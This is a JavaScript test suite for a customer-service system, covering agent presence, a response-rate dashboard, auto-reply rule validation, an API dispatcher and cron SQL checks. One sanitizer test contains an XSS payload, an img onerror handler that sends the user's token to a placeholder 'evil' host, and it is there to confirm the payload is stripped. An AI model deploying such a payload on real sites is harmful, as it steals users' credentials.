const swAgentsDb = (rows, over = {}) => recorder({
  site_settings: { data: [{ key: 'cs_heartbeat_timeout_seconds', value: { value: 90 } },
    { key: 'cs_max_concurrent_default', value: { value: 5 } }], error: null },
  cs_agents: { data: rows, error: null },
  cs_sessions: { data: [{ agent_id: swAid }, { agent_id: swAid }, { agent_id: null }], error: null },
  user_profiles: { data: [{ user_id: swAid, display_name: '客服小李', group_name: 'presale' }], error: null },
  ...over
})
const swFresh = new Date(swNow - 10_000).toISOString()
const swOld = new Date(swNow - 600_000).toISOString()
let swAgOut = await sxListAgents(swAgentsDb([
  { user_id: swAid, online: true, last_heartbeat: swFresh, max_concurrent: null, status_note: '午休回来' },
  { user_id: 'ghost', online: true, last_heartbeat: swOld, max_concurrent: 3, status_note: null },
  { user_id: 'away', online: false, last_heartbeat: swFresh, max_concurrent: 0, status_note: null }
]), swAdmin)
assert(swAgOut.status === 200, '管理员能看在线名单')
const swAg = Object.fromEntries(swAgOut.body.agents.map(a => [a.user_id, a]))
assert(swAg[swAid].effective_online === true && swAg[swAid].load === 2, '在线的人带上当前负载')
assert(swAg.ghost.online === true && swAg.ghost.heartbeat_stale === true && swAg.ghost.effective_online === false,
  '心跳过期的人 online 列还是 true，但 effective_online 必须是 false——' +
  '浏览器被直接关掉时来不及发那次下线请求，而按 online 分配就是把会话分给一个不在的人')
assert(swAg.away.effective_online === false, '主动置为离线的人不在线，哪怕心跳还新')
assert(swAgOut.body.online_count === 1, '在线人数按 effective_online 算')
assert(swAg[swAid].max_concurrent === 5 && swAg[swAid].max_concurrent_explicit === false,
  'null 上限显示成默认值，并标出这是回落来的——界面上要能区分「没设过」和「就是 5」')
assert(swAg.away.max_concurrent === 0 && swAg.away.max_concurrent_explicit === true,
  '0 是「暂时不接新会话」，不能被当成没设过而换成 5——那会让一个刚点了不接入的客服立刻又被接进五个会话')
assert(swAg[swAid].load === 2 && swAgOut.body.agents.every(a => typeof a.load === 'number'),
  '负载现算，不存计数列——存的话它和真实会话数不一致只是时间问题，而不一致的方向是有人被分到第八个会话')

// 客服自己只看得到自己那行。别人的负载和备注是排班信息。
const swSelfOut = await sxListAgents(swAgentsDb([
  { user_id: swAid, online: true, last_heartbeat: swFresh, max_concurrent: null, status_note: '午休回来' },
  { user_id: 'ghost', online: true, last_heartbeat: swFresh, max_concurrent: 3, status_note: '在处理投诉' }
]), swPresale)
assert(swSelfOut.body.agents.length === 1 && swSelfOut.body.agents[0].user_id === swAid,
  '客服只看到自己那一行')
assert(swSelfOut.body.online_count === 2, '但在线人数是全站的——客服要知道现在有几个人在，才知道能不能下线')
assert((await sxListAgents(recorder({}), { userId: 'u', group: 'default', rank: 0 })).status === 403,
  '普通用户看不到客服名单')
const swNoAgentsDb = swAgentsDb([])
const swNoAgents = await sxListAgents(swNoAgentsDb, swAdmin)
assert(swNoAgents.status === 200 && swNoAgents.body.agents.length === 0, '没有客服时不报错')
assert(!swNoAgentsDb.tables.includes('user_profiles'), '一个客服都没有就不必查 profile')

// §2.13 看板。分母是「区间内建立的所有会话」，包括一直没人回的那些。
const swBoardRows = [
  { id: 's1', channel: 'presale', agent_id: swAid, status: 'closed', first_response_seconds: 10, timed_out: false, created_at: '2026-08-28T00:00:00.000Z' },
  { id: 's2', channel: 'presale', agent_id: swAid, status: 'closed', first_response_seconds: 30, timed_out: true, created_at: '2026-08-28T01:00:00.000Z' },
  // 一直没人回的那条：first_response_seconds 是 null。它必须进分母、不进分子。
  { id: 's3', channel: 'presale', agent_id: null, status: 'open', first_response_seconds: null, timed_out: false, created_at: '2026-08-28T02:00:00.000Z' },
  { id: 's4', channel: 'postsale', agent_id: 'other', status: 'closed', first_response_seconds: 50, timed_out: false, created_at: '2026-08-28T03:00:00.000Z' }
]
const swBoardDb = recorder({
  cs_sessions: { data: swBoardRows, error: null },
  user_profiles: { data: [{ user_id: swAid, display_name: '客服小李' }], error: null }
})
const swBoard = (await sxDashboard(swBoardDb, swAdmin, { days: 7 })).body
assert(swBoard.overall.total === 4 && swBoard.overall.answered === 3,
  '没人回的那条要进分母、不进分子——用「有过回复的会话」当分母会让响应率永远接近 100%，' +
  '而这个看板的全部意义就是暴露没人回的那些')
assert(swBoard.overall.reply_rate === 0.75, '响应率是 3/4')
assert(swBoard.overall.timeout_rate === 0.25, '超时率是 1/4')
assert(swBoard.by_channel.presale.total === 3 && swBoard.by_channel.postsale.total === 1, '按渠道拆开')
assert(swBoard.by_channel.presale.reply_rate === 2 / 3, '售前的响应率单独算')
assert(swBoard.by_agent.length === 2, '按客服拆一份：谁的超时率高是排班问题，看总数看不出来')
assert(swBoard.by_agent[0].total >= swBoard.by_agent[1].total, '按会话数倒序，忙的人在前面')
assert(swBoard.by_agent.find(a => a.user_id === swAid).display_name === '客服小李',
  '带上显示名——一列 uuid 没法用来排班')
assert(!swBoard.by_agent.some(a => a.user_id === null || a.user_id === 'null'),
  '没有客服的会话不进按客服的拆分，但仍在总数里')
assert(swBoard.overall.avg_first_response_seconds === 30, '均值只按有回复的三条算：(10+30+50)/3')
assert(swBoard.overall.median_first_response_seconds === 30,
  '中位数一起给：平均值会被一个隔夜才回的会话彻底带偏，而那种会话每天都有一两个')
assert(swBoard.queued_now === 1,
  '排队中的会话数是「现在」的事实：没人回的会话正在积压时，一个按 30 天平均的数字看起来完全正常')
const swBoardQ = swBoardDb.calls.find(c => c.table === 'cs_sessions')
assert(swBoardQ.gte?.created_at, '按建立时间截取区间')
assert(swBoardQ.limit === 5000, '有上限，不把全部历史拉进内存')
assert(Date.parse(swBoard.since) > swNow - 8 * 86400000 && Date.parse(swBoard.since) <= swNow,
  'days=7 的区间起点在七天内')
const swClamp = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, { days: 9999 })).body
assert(swClamp.days === 365, 'days 夹到 365')
const swZero = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, { days: 0 })).body
assert(swZero.days === 30, 'days=0 回落到 30，不是查零天')
assert((await sxDashboard(recorder({}), swCs, {})).status === 403, '客服看不到看板')
const swEmptyBoard = (await sxDashboard(recorder({ cs_sessions: { data: [], error: null } }), swAdmin, {})).body
assert(swEmptyBoard.overall.total === 0 && swEmptyBoard.overall.reply_rate === 0,
  '没有会话时给 0，不是 NaN——NaN 在界面上渲染成空白，看起来像加载失败')

console.log('CS workbench: OK')
// --- §3 自动回复规则管理 --------------------------------------------------------------------------
// 这些规则的正文会发给每一个开会话的用户，所以它是一个「一次配置、全站可见」的写入口。校验松一点的
// 代价不是一条坏数据，而是每个新会话都收到那条坏数据。
const arId = '13131313-1313-4313-8313-131313131313'
const arAuth = { userId: 'admin-3', group: 'admin' }
const arBase = {
  id: arId, name: '退款说明', enabled: true, trigger: 'keyword', channel: 'both',
  keywords: ['退款'], match_mode: 'contains', body: '退款请在订单页提交申请。', format: 'plain',
  once_per_session: true, priority: 10, created_by: 'admin-3'
}

// 服务端决定的列不接受请求里的值。created_by 尤其重要：允许改的话，一条规则可以被伪造成别人建的，
// 而那正是出问题时第一个要查的字段。
assert(SX_RULE_NEVER.includes('created_by') && SX_RULE_NEVER.includes('id'),
  'created_by 和 id 不可写')
const arForgeDb = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: arBase, error: null }] })
await sxUpdateRule(arForgeDb, arId, { id: 'forged', created_by: 'someone-else',
  created_at: '1999-01-01', updated_at: '1999-01-01', name: '改个名' })
const arForged = arForgeDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'update').payload
for (const key of ['id', 'created_by', 'created_at']) {
  assert(!(key in arForged), `${key} 不能进 update 的载荷——允许改的话，一条规则可以被伪造成别人建的`)
}
// updated_at 也在 NEVER_WRITABLE 里，但它和上面三个不同：服务端自己要写它。这里要的是「请求体里的
// 值不作数」，不是「这个键不出现」——写成后者的话，那次断言会逼着把时间戳的维护删掉。
assert(arForged.updated_at && arForged.updated_at !== '1999-01-01',
  'updated_at 由服务端生成，请求体里的值不作数')
assert(Date.parse(arForged.updated_at) > Date.now() - 60_000, 'updated_at 是此刻，不是请求里带来的旧值')
// validateRule 只从已知字段构造输出，所以未知字段自然落不进去——但这一条要钉住，
// 因为把它改成 { ...input } 是一次看起来无害的「简化」。
const arUnknown = sxValidateRule({ trigger: 'session_open', body: '你好', evil: 1, created_by: 'x' })
assert(arUnknown.ok && !('evil' in arUnknown.value) && !('created_by' in arUnknown.value),
  '未知字段不透传：这个函数是白名单，不是过滤器')

// 新建时 trigger 必填。缺它的规则不知道什么时候该发，落库之后是一条永不触发的死规则。
assert(sxValidateRule({ body: '你好' }).ok === false, 'trigger 必填')
// 后台的规则编辑器（AdminAutoReplies.vue）从 shared/cs.mjs 拿这个函数，接口从这里拿。必须是同一个：
// 抄一份到前端，宽一档的那份会让界面判合法而接口回 400，填的人只看到一个点了报错却不说哪错的保存按钮。
assert(sxValidateRule === sxSharedValidateRule,
  'validateRule 只有一份，在 shared/cs.mjs；接口这边是 re-export')
assert(sxValidateRule({ trigger: 'nope', body: '你好' }).ok === false, 'trigger 只能是三种之一')
assert(sxValidateRule({ trigger: 'session_open', body: '你好' }).ok === true, '会话开启触发不需要关键词')
// 关键词触发必须有关键词：一条 keywords 为空的 keyword 规则在 matchesKeyword 里永远不匹配，
// 于是它安静地什么都不做，而配的人以为自己配好了。
assert(sxValidateRule({ trigger: 'keyword', keywords: [], body: '你好' }).ok === false,
  '关键词触发必须至少配一个关键词')
assert(sxValidateRule({ trigger: 'keyword', body: '你好' }).ok === false, '连 keywords 字段都没有同样要拒')
assert(sxValidateRule({ trigger: 'keyword', keywords: ['退款'], body: '你好' }).ok === true, '有关键词就行')
assert(sxValidateRule({ trigger: 'session_open', body: '   ' }).ok === false, '正文不能是空白')
assert(sxValidateRule({ trigger: 'session_open' }).ok === false, '正文必填')

// 关键词的归一化。
const arKw = sxValidateRule({ trigger: 'keyword', keywords: ['退款', '退款', ' 退款 ', '', '  ', null, '发票'], body: 'x' })
assert(arKw.ok && arKw.value.keywords.length === 2,
  '去重且去掉空串——空串在 contains 模式下匹配任何文本，等于让这条规则对每句话都触发')
assert(arKw.value.keywords.includes('退款') && arKw.value.keywords.includes('发票'), '前后空格要 trim')
assert(sxValidateRule({ trigger: 'keyword', keywords: 'x', body: 'y' }).ok === false, 'keywords 必须是数组')
assert(sxValidateRule({ trigger: 'keyword', keywords: ['x'.repeat(101)], body: 'y' }).ok === false,
  '单个关键词有长度上限')
assert(sxValidateRule({ trigger: 'keyword', keywords: Array.from({ length: 51 }, (_, i) => `k${i}`), body: 'y' }).ok === false,
  '关键词最多 50 个——一条规则配上几千个词，每条用户消息都要跑一遍那个循环')
assert(sxValidateRule({ trigger: 'keyword', keywords: Array.from({ length: 60 }, () => '同一个词'), body: 'y' })
  .value.keywords.length === 1, '上限是去重之后算的：六十个同样的词只是一个词')

assert(sxValidateRule({ trigger: 'session_open', body: 'x'.repeat(4001) }).ok === false, '正文有长度上限')
assert(sxValidateRule({ trigger: 'session_open', body: 'x', match_mode: 'nope' }).ok === false, 'match_mode 要在名单里')
assert(sxValidateRule({ trigger: 'session_open', body: 'x', format: 'nope' }).ok === false, 'format 要在名单里')
for (const p of [1.5, 'abc', 1001, -1001, NaN]) {
  assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: p }).ok === false,
    `priority ${p} 应拒——优先级决定同时命中时发哪条，一个 NaN 会让排序结果不可预测`)
}
assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: 0 }).ok === true, 'priority 可以是 0')
assert(sxValidateRule({ trigger: 'session_open', body: 'x', priority: -1000 }).ok === true, '下界可取')

// html 格式的正文进来就清洗，和用户发的消息同一套规则。「管理员不会写恶意 HTML」不是一个能依赖的
// 前提：被盗的管理员账号第一件能做的事，就是往每个新会话里投一段脚本。
const arHtml = sxValidateRule({ trigger: 'session_open', format: 'html',
  body: '<b>你好</b><img src=x onerror="fetch(`/api/me`).then(r=>r.json()).then(d=>fetch(`//evil/`+d.token))">' })
assert(arHtml.ok && arHtml.value.body.includes('<b>') && !/onerror/i.test(arHtml.value.body),
  'html 正文落库前就清洗掉事件属性')
assert(!/script/i.test(sxValidateRule({ trigger: 'session_open', format: 'html', body: '<script>x</script>a' }).value.body),
  'script 标签同样清掉')
// 非 html 的不能被清洗：markdown 里的 <b> 是字面文本，清掉就改了管理员写的内容。
const arMd = sxValidateRule({ trigger: 'session_open', format: 'markdown', body: '用 <b> 可以加粗' })
assert(arMd.value.body === '用 <b> 可以加粗', 'markdown 正文原样存，清洗只对 html 生效')
assert(sxValidateRule({ enabled: false }, { partial: true }).ok === true, 'partial 只改一个开关是合法的')
assert(sxValidateRule({}, { partial: true }).ok === false, '空 patch 要拒，不能发一条什么都不改的 update')

// 新建：created_by 来自 auth，不是请求体。
const arCreateDb = recorder({ cs_auto_replies: { data: arBase, error: null } })
const arCreated = await sxCreateRule(arCreateDb, arAuth,
  { trigger: 'keyword', keywords: ['退款'], body: '退款请在订单页提交申请。', created_by: 'forged' })
assert(arCreated.status === 201, '合法规则可以建')
const arIns = arCreateDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'insert').payload
assert(arIns.created_by === 'admin-3', 'created_by 取自 auth，请求体里的伪造值不作数')
const arRejectDb = recorder({})
assert((await sxCreateRule(arRejectDb, arAuth, { body: 'x' })).status === 400, '不合法的直接 400')
assert(!arRejectDb.tables.includes('cs_auto_replies'), '校验没过就不该碰表')

// 改：跨字段校验要拿现有行补齐。只改 trigger 为 keyword 而不带 keywords 的请求，光看请求体是合法的，
// 看完整状态才知道它会造出一条永不触发的规则。
assert((await sxUpdateRule(recorder({}), 'not-a-uuid', { name: 'x' })).status === 400, 'id 要过 UUID 校验')
assert((await sxUpdateRule(recorder({ cs_auto_replies: { data: null, error: null } }), arId, { name: 'x' })).status === 404,
  '规则不存在给 404')
const arNoKw = await sxUpdateRule(
  recorder({ cs_auto_replies: { data: { ...arBase, trigger: 'session_open', keywords: [] }, error: null } }),
  arId, { trigger: 'keyword' })
assert(arNoKw.status === 400 && /关键词/.test(arNoKw.body.error),
  '把 trigger 改成 keyword 而现有行没有关键词，要拒——否则那条规则从此安静地什么都不做')
const arHasKw = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: arBase, error: null }] })
assert((await sxUpdateRule(arHasKw, arId, { trigger: 'keyword' })).status === 200,
  '现有行已经有关键词，只改 trigger 是合法的')
const arClearKw = await sxUpdateRule(recorder({ cs_auto_replies: { data: arBase, error: null } }),
  arId, { keywords: [] })
assert(arClearKw.status === 400, '把一条 keyword 规则的关键词清空同样要拒（合并后的状态才是判断依据）')
const arClearBody = await sxUpdateRule(recorder({ cs_auto_replies: { data: arBase, error: null } }),
  arId, { body: '   ' })
assert(arClearBody.status === 400, '正文清空要拒：一条空正文的规则会发出一条空消息')
const arUpdDb = recorder({ cs_auto_replies: [{ data: arBase, error: null }, { data: { ...arBase, name: '新名字' }, error: null }] })
const arUpd = await sxUpdateRule(arUpdDb, arId, { name: '新名字' })
assert(arUpd.status === 200 && arUpd.body.rule.name === '新名字', '改名成功并回新行')
const arUpdCall = arUpdDb.calls.find(c => c.table === 'cs_auto_replies' && c.op === 'update')
assert(arUpdCall.filters.id === arId, 'update 必须带 id 条件——漏掉就是把全部规则改成同一条')
assert(arUpdCall.payload.updated_at, '刷 updated_at：规则列表要能看出哪条最近被动过')

// 删：改成 enabled=false 是另一件事，两者都要有。
assert((await sxDeleteRule(recorder({}), 'nope')).status === 400, '删也要过 UUID 校验')
assert((await sxDeleteRule(recorder({ cs_auto_replies: { data: null, error: null } }), arId)).status === 404,
  '删不存在的规则给 404，不是假装成功')
const arDelDb = recorder({ cs_auto_replies: { data: { id: arId }, error: null } })
const arDel = await sxDeleteRule(arDelDb, arId)
assert(arDel.status === 200 && arDel.body.deleted === arId, '删成功回被删的 id')
const arDelCall = arDelDb.calls.find(c => c.op === 'delete')
assert(arDelCall.filters.id === arId, "delete 必须带 id 条件——漏掉它是一句删空整张表的调用")

// 列表：三段排序。同优先级时按建立时间正序，好让管理员看到的顺序和 pickAutoReply 的选择一致——
// 两边不一致的表现是「界面上排第一的那条没有生效」。
const arListDb = recorder({ cs_auto_replies: { data: [arBase], error: null } })
const arList = await sxListRules(arListDb, {})
assert(arList.status === 200 && arList.body.rules.length === 1, '列表能读')
const arOrders = arListDb.calls.find(c => c.table === 'cs_auto_replies').orders
assert(arOrders.length === 3, '三段排序：先按触发方式分组，再按优先级倒序，最后按建立时间正序')
assert(arOrders[0].col === 'trigger' && arOrders[1].col === 'priority' && arOrders[1].ascending === false &&
  arOrders[2].col === 'created_at' && arOrders[2].ascending === true, '三段的顺序和方向')
const arFiltered = recorder({ cs_auto_replies: { data: [], error: null } })
await sxListRules(arFiltered, { trigger: 'keyword', enabled: false })
const arFq = arFiltered.calls.find(c => c.table === 'cs_auto_replies')
assert(arFq.filters.trigger === 'keyword', 'trigger 筛选落到 SQL')
assert(arFq.filters.enabled === false,
  'enabled=false 要能筛——用 if (input.enabled) 判断的话，「只看停用的」这个筛选永远筛不出东西')
const arBadFilter = recorder({ cs_auto_replies: { data: [], error: null } })
await sxListRules(arBadFilter, { trigger: 'nope' })
assert(!('trigger' in arBadFilter.calls.find(c => c.table === 'cs_auto_replies').filters),
  '不认识的 trigger 值忽略，不原样拼进查询')

console.log('CS auto-reply rules: OK')

// ── /api 只有一个 Serverless Function：分发 ─────────────────────────────────────
// Hobby 计划一次部署最多 12 个 Serverless Function。23 个接口各占一个函数的那一版：构建成功、部署失败
// （exceeded_serverless_functions_per_deployment），线上悄悄停在上一版。`npm test` 全绿也照旧看不出来，
// 因为本地 import 一个 .mjs 跟它在线上是不是一个函数无关。所以那条限制在这里写成断言。
import { readdirSync } from 'node:fs'
import dispatch, { ROUTE_NAMES, routeName } from '../api/index.mjs'

const fnEntries = readdirSync(new URL('../api/', import.meta.url)).filter(n => !n.startsWith('_'))
assert(fnEntries.length === 1 && fnEntries[0] === 'index.mjs',
  `api/ 里只准有 index.mjs 一个函数入口，现在还有 ${fnEntries.join(', ')}——` +
  '处理函数要放 api/_routes/（下划线开头的不会被当成函数入口，但照旧能 import）')

const routeFiles = readdirSync(new URL('../api/_routes/', import.meta.url))
  .filter(n => n.endsWith('.mjs')).map(n => n.slice(0, -4)).sort()
assert(routeFiles.join(',') === [...ROUTE_NAMES].sort().join(','),
  `分发表要和 api/_routes/ 一一对应，漏一个的表现是线上 404 而本地测试全绿：\n` +
  `  目录 ${routeFiles.join(',')}\n  路由表 ${[...ROUTE_NAMES].sort().join(',')}`)

// 路由名从哪来。?route= 是 vercel.json 那条重写传的；剥 pathname 是本地直接调 handler 时走的那条。
assert(routeName({ query: { route: 'notifications' } }) === 'notifications', '?route= 直接就是路由名')
assert(routeName({ query: { route: ['cs', 'session'] } }) === 'cs/session',
  ':path* 匹配到多段时 Vercel 给的是数组，拼回来而不是 String() 出一个 "cs,session"')
assert(routeName({ query: {}, url: '/api/notifications?x=1' }) === 'notifications', '退回 pathname，且不含查询串')
assert(routeName({ url: '/api/notifications/' }) === 'notifications', '尾斜杠不算另一个接口')
assert(routeName({ url: '/api/%73ync-github-groups' }) === 'sync-github-groups', 'pathname 要先解码')
assert(routeName({ url: 'https://aetherac.abnt.it/api/telemetry' }) === 'telemetry', '绝对 URL 也认')

// 分发本身：认识的路由要真的走到那个文件的 default，不认识的给 404 而不是 500。
let dispatched = 0
const spyRes = { status(code) { dispatched = code; return this }, json() {}, setHeader() {}, send() {} }
await dispatch({ query: { route: 'nope-not-a-route' } }, spyRes)
assert(dispatched === 404, '不认识的接口给 404')
dispatched = 0
await dispatch({ method: 'GET', headers: {}, query: { route: 'notifications' } }, spyRes)
assert(dispatched === 401, '认识的接口要真的被调起来——未登录的 /api/notifications 是 401，不是 404')

// 重写规则。少了这两条，/api/* 全站 404；顺序也重要：Vercel 不会连锁重写，支付回调那条必须自己指到
// index，指到 /api/payment-callback 的话它落到一个已经不存在的函数上。
const vercelConfig = JSON.parse(readFileSync(new URL('../vercel.json', import.meta.url), 'utf8'))
const rw = vercelConfig.rewrites.map(r => `${r.source} -> ${r.destination}`)
assert(rw.includes('/api/:path* -> /api/index?route=:path*'), `/api/:path* 的重写不见了：${rw.join(' | ')}`)
assert(rw.includes('/v1/callback/:provider -> /api/index?route=payment-callback&provider=:provider'),
  `支付回调的重写要直接指到 index（对外 URL 一个字都不能改，平台那边填的是 /v1/callback/…）：${rw.join(' | ')}`)

console.log('API dispatcher: OK')

// --- §2.9/§9.8/§10.5 的定时任务：supabase/cron.sql 和 JS 那份实现对着钉 -------------------------
// cron.sql 的文件开头承诺过这一段。那四件事（会话超时关闭、心跳失联下线、站内信归档、退款审批升级）
// 是用 SQL 又写了一遍的，代价是超时文案和通知正文在 JS 和 SQL 各有一份。分叉不会报错——症状是同一笔
// 退款在收件箱里出现两种金额写法，或者「配置改了但没生效」。SQL 在本地跑不到，能钉住的只有它的文本。
const cronSql = readFileSync(new URL('../supabase/cron.sql', import.meta.url), 'utf8')
// 对齐用的多余空格在断言里没有意义，先压平；SQL 字面量里的单空格不受影响。
const cronFlat = cronSql.replace(/\s+/g, ' ')

// 分成两个文件本身就是个不变量：create extension 一旦挪进 schema.sql，在装不上 pg_cron 的实例上会把
// 后面几百行表结构一起回滚——一个可选的定时任务把整个建库脚本拖下水。
assert(cronSql.includes('create extension if not exists pg_cron'), 'cron.sql 要自己装 pg_cron')
// 只认行首的语句，不认注释里提到的那句——schema.sql 的开头正解释着为什么它不装。
assert(!/^create extension[^;]*pg_cron/m.test(schemaSql),
  'schema.sql 不能装 pg_cron：那一句失败会回滚整个建库脚本')
assert(schemaSql.includes('supabase/cron.sql'),
  'schema.sql 要写明 cron.sql 得单独再跑一次，否则定时任务永远不会存在，而建库看起来完全成功')

// 四个 job：排了班、调的函数在同一个文件里定义过、并且重跑时会先被 unschedule。少了最后一条，重复执行
// 这个文件会在 pg_cron 1.4 之前留下两份同名任务，每分钟的清理于是跑两遍。
const unschedule = cronFlat.match(/cron\.unschedule\(jobname\)[^;]*;/)[0]
for (const [job, fn] of [
  ['cs-close-idle-sessions', 'private.cs_close_idle_sessions'],
  ['cs-offline-stale-agents', 'private.cs_offline_stale_agents'],
  ['refunds-escalate-pending', 'private.refunds_escalate_pending'],
  ['notifications-auto-archive', 'private.notifications_auto_archive']
]) {
  assert(cronFlat.includes(`cron.schedule('${job}',`), `${job} 没有排班`)
  assert(cronFlat.includes(`$$select ${fn}()$$`), `${job} 要调 ${fn}()`)
  assert(cronFlat.includes(`create or replace function ${fn}(`), `${fn} 排了班但没有定义`)
  assert(unschedule.includes(`'${job}'`), `${job} 不在 unschedule 名单里，重跑这个文件会排出两份`)
}

// 零小数位币种逐字一致，否则 1000 日元在超时提醒里显示成 10 日元，而原通知（JS 那份）显示 1000。
const cronZero = cronSql.match(/when c in \(([^)]*)\)/)[1].split(',').map(s => s.trim().replace(/'/g, ''))
assert(cronZero.join(',') === ZERO_DECIMAL_CURRENCIES.join(','),
  `cron.sql 的零小数位名单和 shared/coupons.mjs 不一致：${cronZero.join(',')}`)
assert(cronFlat.includes("to_char(coalesce(p_minor, 0)::numeric / 100, 'FM999999999990.00')"),
  '其余币种要除 100 保留两位')
// 那段 SQL 要产出和这两行一样的文本：
assert(formatMinor(1000, 'JPY') === '1000 JPY' && formatMinor(1000, 'USD') === '10.00 USD',
  'formatMinor 的两个分支就是 private.format_minor 要复刻的东西')

// §2.9 的四个超时文案键。SQL 里写死的字符串要和 timeoutTextKeys() 拼出来的一致，少一个键的症状是超时后
// 一方收到兜底文案，而管理员在 §14 里填的那句从此不生效。
for (const ch of sxChannels) {
  const keys = sxTimeoutKeys(ch)
  assert(cronFlat.includes(`private.setting_text('${keys.user}'`), `cron.sql 要读 ${keys.user}`)
  assert(cronFlat.includes(`private.setting_text('${keys.agent}'`), `cron.sql 要读 ${keys.agent}`)
}

// cron.sql 读到的每一个 §14 键都要在 seed 里有默认值。读一个不存在的键时 setting_num 会安静地退回
// fallback，表现是「配置页改了没反应」，而这类错在库里查不出来——因为那一行根本不存在。
const cronKeys = [...new Set(
  [...cronSql.matchAll(/private\.setting_(?:num|text)\('([a-z0-9_]+)'/g)].map(m => m[1]))]
assert(cronKeys.length >= 10, `cron.sql 读的配置键太少，正则大概没匹配上：${cronKeys.length}`)
for (const key of cronKeys) {
  assert(schemaSql.includes(`('${key}','{"value"`), `§14 的 seed 里缺 ${key} 的默认值`)
}

// 阈值 0 一律是「关掉这个功能」，不是「立刻执行」。四个任务各要有自己的那道闸——少一道，管理员把配置
// 改成 0 的那一次会在下一分钟关掉全站会话、或者把所有站内信一口气归档。
for (const guard of ['if v_presale <= 0 and v_postsale <= 0 then return 0; end if;',
                     'if v_seconds <= 0 then return 0; end if;',
                     'if v_days <= 0 then return 0; end if;',
                     'if v_timeout <= 0 then return 0; end if;']) {
  assert(cronFlat.includes(guard), `cron.sql 缺一道「0 = 关闭」的闸：${guard}`)
}

// 两处「再判一次」：外层 select 是快照，那一瞬间用户或管理员可能已经动过同一行。拿不到行就跳过，否则
// 会对一个刚被手动关闭的会话再发一遍超时文案。
assert(cronFlat.includes("where id = s.id and status = 'open'"), '关会话要重新断言 status=open')
assert(cronFlat.includes("where id = r.id and status = 'pending'"), '升级要重新断言 status=pending')
assert((cronFlat.match(/if not found then continue; end if;/g) || []).length === 2,
  '两处都要在拿不到行时跳过，而不是继续发通知')

// §10.5 的通知正文。shared/notifications.mjs 的 refundEscalationNotification 到今天仍然没有 JS 调用方，
// cron.sql 才是它的实现，所以这里用哨兵值把 JS 模板还原成 format() 的 %s 形式再逐字比对。
const SENT = { no: '{{NO}}', amt: '{{AMT}}', hrs: '{{HRS}}' }
const escNotif = refundEscalationNotification(
  { refundId: 'r-escNotif', orderNo: SENT.no, amountText: SENT.amt, hours: SENT.hrs })
const asFormat = s => s.replace(/\{\{(?:NO|AMT|HRS)\}\}/g, '%s')
assert(cronFlat.includes(`format('${asFormat(escNotif.title)}', v_hours, v_no)`),
  `升级通知的标题要和 refundEscalationNotification 一致：${asFormat(escNotif.title)}`)
assert(cronFlat.includes(`format('${asFormat(escNotif.body)}', v_no, v_amount, v_hours)`),
  `升级通知的正文要和 refundEscalationNotification 一致：${asFormat(escNotif.body)}`)
assert(cronFlat.includes(`'${escNotif.kind}', '${escNotif.scope}', null,`), '升级通知是发给全体管理员的审批请求')
// pinned/highlighted 在 JS 侧是 presentationFor() 算出来的，SQL 是自己的插入口，所以必须写死成 true。
// 落成 schema 默认的 false，表现是一条等着人批的退款躺在列表中间，而不是任何报错。
const escPres = presentationFor(escNotif)
assert(escPres.pinned && escPres.highlighted, 'presentationFor 认为超时升级该置顶高亮')
assert(cronFlat.includes(`'${escNotif.state}', true, true, r.id,`),
  'cron.sql 要显式写 pinned=true, highlighted=true')
assert(cronFlat.includes(
  `'type', '${escNotif.actions[0].type}', 'label', '${escNotif.actions[0].label.replace(SENT.amt, '')}' || v_amount`),
  '批准按钮的文案要带金额')
assert(escNotif.actions.length === 2
  && cronFlat.includes(`'type', '${escNotif.actions[1].type}', 'label', '${escNotif.actions[1].label}'`),
  '催办只有批准和拒绝两个按钮：转交在原通知上已经有了')

// §10.8 的审计。第一次升级写 escalate，之后的重复提醒写 remind；AdminRefunds.vue 的 ACTION_LABEL 要认识
// 这两个字面量，否则审批历史里直接显示英文单词。
assert(cronFlat.includes("case when v_first then 'escalate' else 'remind' end"),
  'cron.sql 要区分首次升级和重复提醒')
const adminRefundsVue = readFileSync(
  new URL('../docs/.vitepress/theme/AdminRefunds.vue', import.meta.url), 'utf8')
for (const action of ['escalate', 'remind']) {
  assert(new RegExp(`^\\s+${action}: '[^']+'`, 'm').test(adminRefundsVue),
    `AdminRefunds.vue 的 ACTION_LABEL 里缺 ${action} 的中文`)
}
// 系统写入的形状：没有操作人、组名留空。AdminRefunds.vue 的 personName(null) 靠这个显示「系统」，
// 而不是显示成一个查不到的用户——那两种情况的处置办法完全不同。
assert(cronFlat.includes("values (r.id, null, '', case when v_first"),
  '审计行的 actor_id 要为空、actor_group 要留空')
// 状态确实没变，所以审计行不写 from_status/to_status：写成 pending→pending 会让审计看起来发生过一次迁移。
assert(cronFlat.includes(
  'insert into public.refund_audit_log (refund_id, actor_id, actor_group, action, amount_minor, note)'),
  '审计行只写这六列——出现 from_status/to_status 就等于宣称状态迁移过')

// 待处理的站内信一条都不自动归档（两步都要跳过），否则 §9.6 的强制置顶多了一个会随时间自动触发的后门。
assert((cronFlat.match(/state is distinct from 'pending'/g) || []).length === 2,
  '自动归档的两步都要跳过 state=pending')
assert(!cronFlat.includes('set read_at'),
  '归档不等于读过：顺手写 read_at 会让「我从没看过这条」变成一句假话')

// §14 的 audit_log_retention_days 故意没有对应任务（理由写在 cron.sql 末尾）。真要加，得先定义订单状态机
// 的终态——一笔还开着的退款，审计流水比它自己先被删掉的话，事后没有任何东西能解释那笔钱去哪了。
assert(!cronFlat.includes("setting_num('audit_log_retention_days'"),
  '删审计流水的任务不能顺手加进来：不可逆，且要先有终态判断')
assert(cronSql.includes('audit_log_retention_days'), 'cron.sql 要写明这个空缺是有意留的')

console.log('cron.sql: OK')



